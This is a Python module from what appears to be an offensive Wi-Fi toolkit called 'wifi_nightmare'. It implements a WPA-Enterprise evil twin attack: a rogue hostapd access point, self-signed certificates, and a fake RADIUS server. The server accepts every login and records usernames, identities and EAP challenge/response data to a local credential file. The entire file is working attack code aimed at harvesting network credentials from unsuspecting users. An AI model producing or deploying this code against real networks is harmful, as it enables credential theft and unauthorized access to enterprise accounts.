# radius_fake.py
"""
Fake RADIUS Server — WPA-Enterprise (802.1X) credential harvesting.

Strategy:
  1. Run a rogue hostapd with WPA-Enterprise (EAP) configuration
  2. Embedded fake RADIUS server accepts any credentials
  3. Logs username + challenge response (NT hash / PEAP credentials)
"""
import os
import sys
import time
import socket
import struct
import threading
import subprocess
import tempfile
from dataclasses import dataclass, field
from typing import Optional, List

from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_GREY, C_RESET
from wifi_nightmare.logger import logger

RADIUS_ACCESS_REQUEST   = 1
RADIUS_ACCESS_ACCEPT    = 2
RADIUS_ACCESS_REJECT    = 3
RADIUS_ACCESS_CHALLENGE = 11

ATTR_USER_NAME     = 1
ATTR_USER_PASSWORD = 2
ATTR_NAS_IP        = 4
ATTR_EAP_MESSAGE   = 79
ATTR_MESSAGE_AUTH  = 80


@dataclass
class EAPCredential:
    username: str
    identity: str
    client_mac: str = ""
    challenge: str = ""
    response: str = ""
    method: str = ""
    timestamp: float = field(default_factory=time.time)


class RADIUSPacket:
    """Minimal RADIUS packet parser/builder."""

    def __init__(self, data: bytes = None):
        self.code = 0
        self.identifier = 0
        self.length = 0
        self.authenticator = b'\x00' * 16
        self.attributes = {}
        self.raw_attrs = []
        if data:
            self._parse(data)

    def _parse(self, data: bytes):
        if len(data) < 20:
            return
        self.code = data[0]
        self.identifier = data[1]
        self.length = struct.unpack('!H', data[2:4])[0]
        self.authenticator = data[4:20]
        pos = 20
        while pos < len(data) - 1:
            attr_type = data[pos]
            attr_len = data[pos + 1]
            if attr_len < 2 or pos + attr_len > len(data):
                break
            attr_val = data[pos+2:pos+attr_len]
            self.raw_attrs.append((attr_type, attr_val))
            if attr_type not in self.attributes:
                self.attributes[attr_type] = []
            self.attributes[attr_type].append(attr_val)
            pos += attr_len

    def get_attr(self, attr_type: int) -> Optional[bytes]:
        vals = self.attributes.get(attr_type)
        return vals[0] if vals else None

    def get_username(self) -> str:
        val = self.get_attr(ATTR_USER_NAME)
        return val.decode(errors='replace') if val else ''

    def get_eap_message(self) -> Optional[bytes]:
        msgs = self.attributes.get(ATTR_EAP_MESSAGE, [])
        return b''.join(msgs) if msgs else None

    @staticmethod
    def build_accept(identifier: int, authenticator: bytes) -> bytes:
        length = 20
        pkt = bytes([RADIUS_ACCESS_ACCEPT, identifier,
                     (length >> 8) & 0xff, length & 0xff])
        pkt += authenticator
        return pkt


class FakeRADIUSServer:
    """
    UDP RADIUS server that accepts authentication attempts and logs credentials.
    """

    def __init__(self, host: str = '127.0.0.1', port: int = 1812,
                 shared_secret: str = 'radiussecret'):
        self.host = host
        self.port = port
        self.secret = shared_secret.encode()
        self.credentials: List[EAPCredential] = []
        self.stop_event = threading.Event()
        self._lock = threading.Lock()
        self._sock: Optional[socket.socket] = None
        self._log_file = os.path.expanduser('~/.wifi-nightmare/eap_credentials.txt')
        os.makedirs(os.path.dirname(self._log_file), exist_ok=True)

    def _handle_packet(self, data: bytes, addr: tuple):
        try:
            pkt = RADIUSPacket(data)
            if pkt.code != RADIUS_ACCESS_REQUEST:
                return

            username = pkt.get_username()
            eap_data = pkt.get_eap_message()
            method = 'Unknown'
            identity = username
            challenge = ''
            response = ''

            if eap_data and len(eap_data) >= 4:
                eap_type = eap_data[4] if len(eap_data) > 4 else 0
                type_names = {1: 'Identity', 4: 'MD5', 25: 'PEAP', 21: 'TTLS',
                              13: 'TLS', 43: 'FAST', 18: 'SIM'}
                method = type_names.get(eap_type, f'EAP-{eap_type}')

                if eap_type == 1 and len(eap_data) > 5:
                    try:
                        identity = eap_data[5:].decode(errors='replace')
                    except Exception:
                        pass
                elif eap_type == 4 and len(eap_data) > 6:
                    chal_len = eap_data[5]
                    if len(eap_data) > 5 + chal_len:
                        challenge = eap_data[6:6+chal_len].hex()
                        response_data = eap_data[6+chal_len:]
                        response = response_data.decode(errors='replace')

            cred = EAPCredential(
                username=username,
                identity=identity,
                challenge=challenge,
                response=response,
                method=method
            )

            with self._lock:
                existing = {(c.username, c.identity) for c in self.credentials}
                if (username, identity) not in existing or identity:
                    self.credentials.append(cred)
                    self._log_credential(cred)

            resp = RADIUSPacket.build_accept(pkt.identifier, pkt.authenticator)
            self._sock.sendto(resp, addr)

        except Exception as e:
            logger.debug(f"RADIUS handler error: {e}")

    def _log_credential(self, cred: EAPCredential):
        ts = time.strftime('%Y-%m-%d %H:%M:%S')
        line = f"[{ts}] Method: {cred.method} | User: {cred.username} | Identity: {cred.identity}"
        if cred.challenge:
            line += f" | Challenge: {cred.challenge}"
        if cred.response:
            line += f" | Response: {cred.response}"
        print(f"\n{C_GREEN}[+] EAP CREDENTIAL CAPTURED:{C_RESET}")
        print(f"    {line}")
        with open(self._log_file, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
        logger.info(f"EAP cred: {line}")

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)
        try:
            self._sock.bind((self.host, self.port))
        except OSError as e:
            print(f"{C_RED}[!] Cannot bind RADIUS server on {self.host}:{self.port}: {e}{C_RESET}")
            return False

        print(f"{C_GREEN}[+] Fake RADIUS server listening on {self.host}:{self.port}{C_RESET}")
        print(f"{C_YELLOW}[*] Logging credentials to: {self._log_file}{C_RESET}")

        while not self.stop_event.is_set():
            try:
                data, addr = self._sock.recvfrom(4096)
                threading.Thread(target=self._handle_packet,
                                 args=(data, addr), daemon=True).start()
            except socket.timeout:
                continue
            except Exception as e:
                if not self.stop_event.is_set():
                    logger.debug(f"RADIUS recv error: {e}")

        self._sock.close()
        return True

    def stop(self):
        self.stop_event.set()

    def get_credentials(self) -> List[EAPCredential]:
        with self._lock:
            return list(self.credentials)


def generate_fake_certs(cert_dir: str) -> dict:
    """Generate self-signed CA + server certificate for PEAP/TTLS."""
    os.makedirs(cert_dir, exist_ok=True)
    ca_key = os.path.join(cert_dir, 'ca.key')
    ca_cert = os.path.join(cert_dir, 'ca.pem')
    server_key = os.path.join(cert_dir, 'server.key')
    server_cert = os.path.join(cert_dir, 'server.pem')
    server_csr = os.path.join(cert_dir, 'server.csr')
    dh_file = os.path.join(cert_dir, 'dh.pem')

    def run(cmd):
        subprocess.run(cmd, check=True, capture_output=True)

    try:
        if not os.path.exists(ca_cert):
            run(['openssl', 'genrsa', '-out', ca_key, '2048'])
            run(['openssl', 'req', '-new', '-x509', '-days', '3650',
                 '-key', ca_key, '-out', ca_cert,
                 '-subj', '/CN=WiFi-CA/O=WiFi/C=US'])

        if not os.path.exists(server_cert):
            run(['openssl', 'genrsa', '-out', server_key, '2048'])
            run(['openssl', 'req', '-new', '-key', server_key,
                 '-out', server_csr,
                 '-subj', '/CN=radius.local/O=WiFi/C=US'])
            run(['openssl', 'x509', '-req', '-days', '3650',
                 '-in', server_csr, '-CA', ca_cert, '-CAkey', ca_key,
                 '-CAcreateserial', '-out', server_cert])

        if not os.path.exists(dh_file):
            run(['openssl', 'dhparam', '-out', dh_file, '1024'])

        return {'ca_cert': ca_cert, 'server_cert': server_cert,
                'server_key': server_key, 'dh_file': dh_file}
    except Exception as e:
        logger.error(f"Cert generation failed: {e}")
        return {}


class WPAEnterpriseEvil:
    """WPA-Enterprise Evil Twin Attack with Fake RADIUS backend."""

    def __init__(self, interface: str, ssid: str, channel: int,
                 bssid: str = None, cert_dir: str = None):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.bssid = bssid or '02:00:00:11:22:33'
        self.cert_dir = cert_dir or os.path.expanduser('~/.wifi-nightmare/certs')
        self.radius = FakeRADIUSServer(host='127.0.0.1', port=1812)
        self._hostapd_proc = None
        self._radius_thread = None
        self.stop_event = threading.Event()

    def _write_hostapd_conf(self, certs: dict, tmp_dir: str) -> str:
        conf_path = os.path.join(tmp_dir, 'hostapd_enterprise.conf')
        conf = f"""interface={self.interface}
ssid={self.ssid}
channel={self.channel}
hw_mode=g
ieee80211n=1
wmm_enabled=1

wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
auth_algs=1
wpa_pairwise=CCMP

ieee8021x=1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=radiussecret
own_ip_addr=127.0.0.1
"""
        with open(conf_path, 'w', encoding='utf-8') as f:
            f.write(conf)
        return conf_path

    def run(self):
        print(f"\n{C_CYAN}--- WPA-Enterprise Evil Twin ---{C_RESET}")
        print(f"{C_YELLOW}[*] Generating self-signed certificates...{C_RESET}")

        certs = generate_fake_certs(self.cert_dir)
        if not certs:
            print(f"{C_RED}[!] Certificate generation failed. Is openssl installed?{C_RESET}")
            return

        print(f"{C_GREEN}[+] Certificates ready{C_RESET}")

        self._radius_thread = threading.Thread(target=self.radius.start, daemon=True)
        self._radius_thread.start()
        time.sleep(0.5)

        with tempfile.TemporaryDirectory() as tmp:
            conf_path = self._write_hostapd_conf(certs, tmp)
            print(f"{C_YELLOW}[*] Starting hostapd with WPA-Enterprise...{C_RESET}")

            try:
                self._hostapd_proc = subprocess.Popen(
                    ['hostapd', conf_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                print(f"{C_GREEN}[+] Evil WPA-Enterprise AP running! SSID: {self.ssid}{C_RESET}")
                print(f"{C_RED}[*] Waiting for credentials... (Ctrl+C to stop){C_RESET}")

                while not self.stop_event.is_set():
                    if self._hostapd_proc.poll() is not None:
                        print(f"{C_RED}[!] hostapd exited unexpectedly.{C_RESET}")
                        break
                    time.sleep(1)

            except FileNotFoundError:
                print(f"{C_RED}[!] hostapd not found. Install: sudo apt install hostapd{C_RESET}")
            except KeyboardInterrupt:
                pass
            finally:
                self.stop()

        creds = self.radius.get_credentials()
        if creds:
            print(f"\n{C_GREEN}[+] Captured {len(creds)} credential(s):{C_RESET}")
            for c in creds:
                print(f"    User: {c.username} | Identity: {c.identity} | Method: {c.method}")
        else:
            print(f"\n{C_YELLOW}[-] No credentials captured.{C_RESET}")

    def stop(self):
        self.stop_event.set()
        self.radius.stop()
        if self._hostapd_proc and self._hostapd_proc.poll() is None:
            self._hostapd_proc.terminate()
            try:
                self._hostapd_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self._hostapd_proc.kill()
